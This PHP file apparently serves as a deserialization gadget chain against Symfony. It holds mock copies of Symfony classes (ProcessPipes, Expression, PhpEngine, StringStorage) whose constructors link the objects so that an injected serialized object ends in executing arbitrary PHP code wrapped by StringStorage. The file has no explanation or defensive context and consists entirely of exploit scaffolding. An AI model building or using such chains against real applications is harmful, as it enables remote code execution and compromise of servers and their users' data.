<?php

namespace Symfony\Component\Templating\Storage{
	class StringStorage{
		protected $template = '';
		public function __construct($code){
			$this->template = '<?php '.$code.';die(); ?>';
		}
	}
}

namespace Symfony\Component\Templating{
	class TemplateNameParser{}
	class TemplateReference{}
	class PhpEngine{
		protected $parser;
		protected $cache;
		protected $current;
		protected $globals = array();
		public function __construct($s){
			$this->parser = new TemplateNameParser;
			$this->current = new TemplateReference;
			$this->cache = array(NULL=>$s);
		}
	}
}

namespace Symfony\Component\Finder\Expression{
	class Expression{
		private $value;
		public function __construct($p){
			$this->value = $p;
		}
	}
}

namespace Symfony\Component\Process{
	class ProcessPipes{
	    private $files = array();
		public function __construct($e){
			$this->files = array($e);
		}	
	}
}

?>
